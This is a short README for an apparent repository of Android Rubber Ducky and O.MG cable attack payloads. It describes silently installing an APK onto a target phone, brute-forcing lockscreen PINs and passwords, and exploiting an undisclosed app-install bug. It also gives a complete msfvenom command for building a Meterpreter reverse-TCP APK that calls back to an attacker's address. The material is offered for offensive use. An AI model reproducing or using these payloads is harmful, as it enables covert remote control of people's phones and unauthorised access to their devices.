# ANDROID_BLANKET_PARTY
This repository houses all my Android Rubber Ducky payloads, most of these payloads will also work with a O.MG cable

Swipe-to-open.txt will install an apk to the target device that resides in the ducky storage.

The [STAND-ALONE] Pin / Password lockscreen brute force payloads will also be included in 
this Repository.

You can create an APK Payload with metasploit with the following command in the terminal

msfvenom -p android/meterpreter_reverse_tcp LHOST=YOUR_ADDRESS LPORT=5555 -o WHATEVER_NAME.apk

The APK file must then be copied to the ducky along side the bin file you place there as well.

The APK payloads rely on a bug I found and will be reporting soon, within the APP install process
